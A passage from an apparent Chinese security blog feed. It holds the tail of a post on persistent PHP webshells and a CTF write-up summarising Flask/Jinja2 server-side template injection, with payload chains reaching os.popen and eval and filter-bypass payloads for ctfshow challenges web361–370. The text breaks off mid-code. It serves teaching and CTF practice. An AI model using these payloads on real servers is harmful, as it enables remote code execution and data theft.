class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;No hacker!&#x27;</span>;<br>    <span class="hljs-comment">//No hacker!</span><br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)<br>    &#123;<br>        file_put_contents(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        system(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .shell.php&#x27;</span>);<br>        usleep(<span class="hljs-number">3000</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注意看上面代码写入的文件内容（把木马内容覆盖，同时操作的时间间隔也要小于不死马的间隔，这样才能在时间上占据优势。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctfshow</tag>
      
      <tag>web</tag>
      
      <tag>wp</tag>
      
      <tag>权限维持</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI利用总结</title>
    <link href="/2022/05/06/blog0019-ctfshow-SSTI-wp/"/>
    <url>/2022/05/06/blog0019-ctfshow-SSTI-wp/</url>
    
    <content type="html"><![CDATA[<p>SSTI，模板引擎注入，主要是利用模板引擎的不正确解析，从而造成信息泄露乃至代码执行等问题。由于涉及到代码执行，因此也常常会和pyjail等沙箱问题一起考察。</p><span id="more"></span><h2 id="flask相关知识">flask相关知识</h2><h3 id="模板相关">模板相关</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">变量块 &#123;&#123;&#125;&#125;用于将表达式打印到模板输出<br>注释块 &#123;##&#125;注释<br>控制块&#123;%%&#125;可以声明变量，也可以执行语句<br>行声明##可以有和&#123;%%&#125;相同的效果<br></code></pre></td></tr></table></figure><h3 id="内置类和函数">内置类和函数</h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">Flask内置函数和内置对象可以通过</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">self.__dict__._TemplateReference__context.keys</span>()&#125;&#125;</span><span class="xml">查看，然后可以查看一下这几个东西的类型，类可以通过__init__方法跳到os，函数直接用__globals__方法跳到os。（payload一下子就简洁了）</span><br><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">self.__dict__._TemplateReference__context.keys</span>()&#125;&#125;</span><span class="xml"></span><br><span class="xml">#查看内置函数</span><br><span class="xml">#函数：lipsum、url_for、get_flashed_messages</span><br><span class="xml">#类：cycler、joiner、namespace、config、request、session</span><br><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__.os.popen</span>(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">cycler.__init__.__globals__.os.popen</span>(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="常用方法">常用方法</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs stylus">__class__           查看对象所在的类<br>__mro__             查看继承关系和调用顺序，返回元组<br>__base__            返回基类<br>__bases__           返回基类元组<br>__subclasses__()    返回子类列表<br>__init__            调用初始化函数，可以用来跳到__globals__<br>__globals__         返回函数所在的全局命名空间所定义的全局变量，返回字典<br>__builtins__        返回内建内建名称空间字典<br>__dict__            类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里<br>__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如:<span class="hljs-selector-tag">a</span>.xxx/<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.xxx</span>()）都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。<br>__getitem__()       调用字典中的键值，其实就是调用这个魔术方法，比如<span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;b&#x27;</span>]</span>，就是<span class="hljs-selector-tag">a</span>.__getitem__(<span class="hljs-string">&#x27;b&#x27;</span>)<br><span class="hljs-function"><span class="hljs-title">get</span><span class="hljs-params">()</span></span>通过字典中的键名获取到键值<br><span class="hljs-function"><span class="hljs-title">pop</span><span class="hljs-params">()</span></span>获取列表中的某个元素，移除<br>__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。<br>__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(<span class="hljs-string">&#x27;os&#x27;</span>)<span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-selector-class">.read</span>()]<br>__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。<br><span class="hljs-function"><span class="hljs-title">dict</span><span class="hljs-params">()</span></span> 和join过滤器一起用，可以实现字母数字字符串构造<br>url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span>含有current_app<br>get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span>含有current_app<br>lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;os&#x27;</span>]</span><span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-selector-class">.read</span>()&#125;&#125;<br>&#123;&#123;cycler.__init__.__globals__<span class="hljs-selector-class">.os</span><span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-selector-class">.read</span>()&#125;&#125;<br>current_app          应用上下文，一个全局变量<br>request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><span class="hljs-selector-class">.open</span>(<span class="hljs-string">&#x27;/proc\self\fd/3&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br>request<span class="hljs-selector-class">.args</span><span class="hljs-selector-class">.x1</span>    get传参<br>request<span class="hljs-selector-class">.values</span><span class="hljs-selector-class">.x1</span>  所有参数<br>request<span class="hljs-selector-class">.cookies</span>      cookies参数<br>request<span class="hljs-selector-class">.headers</span>      请求头参数<br>request<span class="hljs-selector-class">.form</span><span class="hljs-selector-class">.x1</span>    post传参(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)<br>request<span class="hljs-selector-class">.data</span>   post传参(Content-Type:a/b)<br>request<span class="hljs-selector-class">.json</span> post传json  (Content-Type: application/json)<br>config               当前application的所有配置。此外，也可以这样&#123;&#123;config.__class__.__init__.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;os&#x27;</span>]</span><span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-selector-class">.read</span>() &#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="过滤器">过滤器</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs gradle">attr()获取属性 <span class="hljs-string">&#x27;&#x27;</span>.__class__ 等价 <span class="hljs-string">&#x27;&#x27;</span>|attr(<span class="hljs-string">&#x27;__class__&#x27;</span>)<br><br>format() 格式化字符串<span class="hljs-string">&quot;%c%c%c%c%c%c%c%c%c&quot;</span>|format(<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">99</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>) 等价 <span class="hljs-string">&#x27;__class__&#x27;</span><br><br><span class="hljs-keyword">int</span>()将值转换为<span class="hljs-keyword">int</span>类型；<br><br><span class="hljs-keyword">float</span>()将值转换为<span class="hljs-keyword">float</span>类型；<br><br>lower()将字符串转换为小写；<br><br>upper()将字符串转换为大写；<br><br>title()把值中的每个单词的首字母都转成大写；<br><br>capitalize()把变量值的首字母转成大写，其余字母转小写；<br><br>trim()截取字符串前面和后面的空白字符；<br><br>wordcount()计算一个长字符串中单词的个数；<br><br><span class="hljs-keyword">reverse</span>()字符串反转；<br><br>replace(value,old,<span class="hljs-keyword">new</span>)替换将old替换为<span class="hljs-keyword">new</span>的字符串；<br><br>truncate(value,length=<span class="hljs-number">255</span>,killwords=<span class="hljs-keyword">False</span>)截取length长度的字符串；<br><br>striptags()删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；<br><br>escape()或e转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。<br><br>safe()禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;<span class="hljs-string">&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;</span>|safe&#125;&#125;；<br><br>list()将变量列成列表；<br><br>string()将变量转换成字符串；<br><br><span class="hljs-keyword">join</span>()将一个序列中的参数值拼接成字符串。<span class="hljs-string">&quot;&quot;</span>[[<span class="hljs-string">&#x27;__clas&#x27;</span>,<span class="hljs-string">&#x27;s__&#x27;</span>]|<span class="hljs-keyword">join</span>] 或者 <span class="hljs-string">&quot;&quot;</span>[(<span class="hljs-string">&#x27;__clas&#x27;</span>,<span class="hljs-string">&#x27;s__&#x27;</span>)|<span class="hljs-keyword">join</span>]<br><br><span class="hljs-keyword">abs</span>()返回一个数值的绝对值；<br><br>first()返回一个序列的第一个元素；<br><br>last()返回一个序列的最后一个元素；<br><br>format(value,arags,*kwargs)格式化字符串。比如：&#123;&#123;<span class="hljs-string">&quot;%s&quot;</span> - <span class="hljs-string">&quot;%s&quot;</span>|format(<span class="hljs-string">&#x27;Hello?&#x27;</span>,<span class="hljs-string">&quot;Foo!&quot;</span>) &#125;&#125;将输出：Helloo? - Foo!<br><br>length()返回一个序列或者字典的长度；<br><br>sum()返回列表内数值的和；<br><br><span class="hljs-keyword">sort</span>()返回排序后的列表；<br><br><span class="hljs-keyword">default</span>(value,default_value,<span class="hljs-keyword">boolean</span>=<span class="hljs-keyword">false</span>)如果当前变量没有值，则会使用参数中的值来代替。示例：name|<span class="hljs-keyword">default</span>(<span class="hljs-string">&#x27;xiaotuo&#x27;</span>)----如果name不存在，则会使用xiaotuo来替代。<span class="hljs-keyword">boolean</span>=<span class="hljs-keyword">False</span>默认是在只有这个变量为undefined的时候才会使用<span class="hljs-keyword">default</span>中的值，如果想使用python的形式判断是否为<span class="hljs-keyword">false</span>，则可以传递<span class="hljs-keyword">boolean</span>=<span class="hljs-keyword">true</span>。也可以使用or来替换。<br><br>length()返回字符串的长度，别名是<span class="hljs-keyword">count</span><br></code></pre></td></tr></table></figure><h3 id="通用链子">通用链子</h3><h4 id="popen链子py3">popen链子（py3）</h4><p>subclasses处的下标需要根据情况确定</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">os._wrap_close 类里有popen<br><br><span class="hljs-string">&quot;&quot;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">128</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>[</span></span>&#x27;popen&#x27;](&#x27;whoami&#x27;).read<span class="hljs-literal">()</span><br><span class="hljs-string">&quot;&quot;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">128</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>.</span></span>popen(&#x27;whoami&#x27;).read<span class="hljs-literal">()</span><br><br></code></pre></td></tr></table></figure><h4 id="builtins__控制链">__builtins__控制链</h4><p>导入python中的内置模块、函数，查找是否存在可利用的方法</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__builtins__</span>下有eval，<span class="hljs-variable">__import__</span>等的函数，可以利用此来执行命令<br><br><span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">250</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)<br><span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">250</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>.<span class="hljs-variable">__builtins__</span>.eval(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)<br><span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">250</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>.<span class="hljs-variable">__builtins__</span>.<span class="hljs-variable">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;id&#x27;</span>).read()<br><span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">250</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;id&#x27;</span>).read()<br><br></code></pre></td></tr></table></figure><h4 id="控制语句getshell">控制语句getshell</h4><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="xml">原理就是找到含有 __builtins__ 的类，然后利用</span><br><span class="xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;) &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="xml"></span><br><span class="xml">#读写文件</span><br><span class="xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="xml"></span><br><span class="xml"></span><br></code></pre></td></tr></table></figure><h2 id="web361">web361</h2><p>常见的flask SSTI攻击，使用花括号从而将攻击语句实现攻击。</p><p>pyjail思路：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;().__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">132</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>flask自带类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;cycler.__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>][<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;whoami&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="web362">web362</h2><p>不让使用132下标对应的<code>os._wrap_close</code>类，waf就是不让输入3,2的数字</p><p>于是使用数学四则运算绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[17*8-4].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="web363引号过滤">web363（引号过滤）</h2><p>对于Python的引号过滤，我们有如下三种思路</p><ol type="1"><li>使用flask自带的request类实现参数外带，将真正的payload转移到其他攻击语句中</li><li>使用原生的字符串拼接（flask过滤器，构造对应的字符）</li><li>使用chr函数绕过</li><li>使用16进制绕过</li></ol><p>使用flask自带的request类实现参数外带</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__.os.popen(request.args.wis).read()&#125;&#125;&amp;wis=cat%<span class="hljs-number">20</span>/flag<br></code></pre></td></tr></table></figure><p>使用原生的字符串拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 这样就构造出了os的字符串</span><br>&#123;&#123;(()|select|string)[<span class="hljs-number">8</span>] + (()|select|string)[<span class="hljs-number">18</span>]&#125;&#125;<br><span class="hljs-comment"># 也可以使用dict函数过滤</span><br>&#123;&#123;(<span class="hljs-built_in">dict</span>(c=o)|join)~(<span class="hljs-built_in">dict</span>(a=s)|join)&#125;&#125;<br></code></pre></td></tr></table></figure><p>使用16进制编码绕过，需要注意的是，此时我们的代码中是\x5f，一直到被模板引擎解析了才转变为具体的字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;((lipsum|attr(<span class="hljs-string">&quot;\\x5f\\x5fglo&quot;</span><span class="hljs-string">&quot;bals\\x5f\\x5f&quot;</span>)|attr(<span class="hljs-string">&quot;get&quot;</span>)(<span class="hljs-string">&quot;\\x5f\\x5fbuiltins\\x5f\\x5f&quot;</span>))|attr(<span class="hljs-string">&quot;get&quot;</span>)(<span class="hljs-string">&quot;eval&quot;</span>))(<span class="hljs-string">&quot;\\x5f\\x5fimport\\x5f\\x5f(\\x22os\\x22)\\x2epopen(\\x22whoami\\x22)\\x2eread()&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><p>使用chr函数绕过，此处因为原生不存在chr函数，因此我们需要先导入chr函数</p><p>这需要使用flask模板中的控制语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#123;% set chr=().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__.__builtins__.chr %&#125;</span><br><span class="hljs-string">&#123;% print(cycler.__init__.__globals__.os.popen(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()) %&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="web364args过滤">web364（args过滤）</h2><p>上一题的第一种方法无法使用，但是我们可以使用request的属性。</p><p>同理，我们能用的还有headers，form，values等等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__.os.popen(request.cookies.wis).read()&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="web365过滤">web365（[]过滤）</h2><p>[]过滤最大的影响就是需要找到能够替代索引或者键名的方法</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta"># 对于list，可以使用pop方法，移除该元素，并获得该元素</span><br>[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>].pop(<span class="hljs-number">4</span>) # <span class="hljs-number">4</span><br><br><span class="hljs-meta"># 对于字符串，get/__getitem__,根据索引获取到对应的值</span><br><br><span class="hljs-meta"># 对于dict，可以使用get或者__getitem__方法，根据键名获取到对应的值</span><br></code></pre></td></tr></table></figure><p>payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;&#123;&#123;().__class__.__base__.__subclasses__().pop(132).__init__.__globals__.popen(</span><br><span class="hljs-string">(config|string).__getitem__(22)+(config|string).__getitem__(40)+(config|string).__getitem__(23)+(config|string).__getitem__(7)+(config|string).__getitem__(279)+(config|string).__getitem__(4)+(config|string).__getitem__(41)+(config|string).__getitem__(40)+(config|string).__getitem__(6)</span><br><span class="hljs-string">).read()&#125;&#125;&#x27;&#x27;&#x27;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="web366_过滤">web366(_过滤)</h2><p>字符串的过滤使用request的参数绕过</p><p>对于_的过滤，__getitem__可行性不高，但是可以使用flask自带的过滤器attr</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="web367os过滤">web367(os过滤)</h2><p>使用get方法来实现字典中字符串的获取</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">request.cookies.a</span>)).get(<span class="hljs-name">request.cookies.c</span>).popen(<span class="hljs-name">request.cookies.b</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web368花括号过滤">web368(花括号过滤)</h2><p>使用<code>&#123;% %&#125;</code>控制语句来实现绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-built_in">print</span>((lipsum|attr(request.cookies.a)).get(request.cookies.c).popen(request.cookies.b).read()) %&#125;<br></code></pre></td></tr></table></figure><h2 id="web369request过滤">web369(request过滤)</h2><p>参照365构造字符串的方法，最大的难点在于无法使用"__getitem__"来拼接字符串，但是我们可以利用过滤器将string转化为list</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#123;% print((lipsum|attr((()|select|string|list).pop(24)+(()|select|string|list).pop(24)+(()|select|string|list).pop(1)+(()|select|string|list).pop(20)+(()|select|string|list).pop(8)+(()|select|string|list).pop(12)+(()|select|string|list).pop(6)+(()|select|string|list).pop(20)+(()|select|string|list).pop(18)+(()|select|string|list).pop(24)+(()|select|string|list).pop(24)))</span><br><span class="hljs-string">.get((()|select|string|list).pop(8)+(()|select|string|list).pop(18))</span><br><span class="hljs-string">.popen((()|select|string|list).pop(15)+(()|select|string|list).pop(6)+(()|select|string|list).pop(7)+(()|select|string|list).pop(10)+(config|string|list).pop(279)+(()|select|string|list).pop(41)+(()|select|string|list).pop(20)+(()|select|string|list).pop(6)+(()|select|string|list).pop(1)).read()) %&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="web370过滤数字">web370（过滤数字）</h2><p>对于Python，布尔类型是继承至int类型，因此也可以完成运算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">string_concat</span>(<span class="hljs-params">tar:<span class="hljs-built_in">str</span></span>):</span><br>    config  = <span class="hljs-string">&quot;&lt;Config &#123;&#x27;ENV&#x27;: &#x27;production&#x27;, &#x27;DEBUG&#x27;: False, &#x27;TESTING&#x27;: False, &#x27;PROPAGATE_EXCEPTIONS&#x27;: None, &#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;: None, &#x27;SECRET_KEY&#x27;: None, &#x27;PERMANENT_SESSION_LIFETIME&#x27;: datetime.timedelta(days=31), &#x27;USE_X_SENDFILE&#x27;: False, &#x27;SERVER_NAME&#x27;: None, 